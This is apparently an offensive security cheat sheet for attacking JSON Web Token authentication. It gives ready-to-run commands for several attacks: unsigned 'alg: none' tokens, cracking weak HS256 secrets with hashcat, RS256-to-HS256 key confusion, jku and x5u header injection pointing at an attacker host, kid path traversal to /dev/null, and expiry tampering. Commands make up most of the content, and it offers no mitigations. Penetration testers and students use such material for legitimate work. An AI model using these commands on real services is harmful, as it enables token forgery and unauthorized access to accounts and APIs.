# JWT Attacks

!!! tip "Tip"
    Try `alg: none` first — some libraries still accept unsigned tokens. If RS256 is used, check if the public key is exposed (e.g. `/jwks.json`) and try switching to HS256 signed with the public key as the secret.

!!! warning "Watch out"
    JWT signature validation failures often return a generic 401 — confirm you're actually testing the right field by checking what the app decodes, not just what it rejects.

---

## Identifying JWT Usage

### Using Burp Suite

- Capture requests and inspect the **Authorization** header.
- Look for `Authorization: Bearer <JWT>`.

### Extracting JWT from cURL Responses

```bash
curl -v http://10.10.10.10/api -H "Authorization: Bearer <JWT>"
```

### Decoding a JWT

```bash
echo "<JWT Token>" | jwt_tool -d
```

---

## Common JWT Attacks

### None Algorithm Attack

If the server does not validate the algorithm field properly, change it to `none` and remove the signature.

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Replay the modified token:

```bash
curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
```

### Signature Forgery with Weak Secrets

HS256 tokens signed with short or dictionary secrets crack fast with hashcat mode 16500:

```bash
echo "<JWT>" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

Once cracked, forge a new token with any claims:

```bash
jwt_tool <JWT> -S hs256 -p "<cracked_secret>"
```

### Key Confusion Attack (RS256 → HS256)

If the server accepts the algorithm field from the header, swap `RS256` to `HS256` and sign with the RSA public key as the HMAC secret — the server will "verify" using the public key it trusts, producing a valid signature.

Grab the public key (commonly exposed at `/jwks.json`, `/.well-known/jwks.json`, or the JWT's `jku`):

```bash
curl -s http://10.10.10.10/.well-known/jwks.json
```

Forge with jwt_tool:

```bash
jwt_tool <JWT> -X k -pk public.pem
```

### jku Header Injection

If the server honors the `jku` (JWK Set URL) header to fetch the verification key, point it at an attacker-hosted JWKS and sign with the matching private key:

```bash
jwt_tool <JWT> -X s -ju http://attacker.com/jwks.json
```

The server fetches the attacker JWKS, pulls the attacker's public key, and validates the attacker-signed token. Works when the server doesn't pin or allowlist the jku host.

### x5u / x5c Header Injection

Similar to jku but references an X.509 cert chain. Same bypass — the server trusts a cert URL or embedded cert it shouldn't:

```bash
jwt_tool <JWT> -X x -pc attacker.crt -pk attacker.key
```

### kid Path Traversal / SQL Injection

The `kid` header selects a verification key by ID. If the server uses it in a file path or SQL query, inject:

```json
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
```

Signing key becomes an empty file, so you can sign with an empty HMAC secret:

```bash
jwt_tool <JWT> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
```

### Token Expiry Manipulation

If the server does not properly validate token expiration (`exp` claim), modify and replay it:

```json
{
  "exp": 9999999999
}
```

Replay:

```bash
curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
```
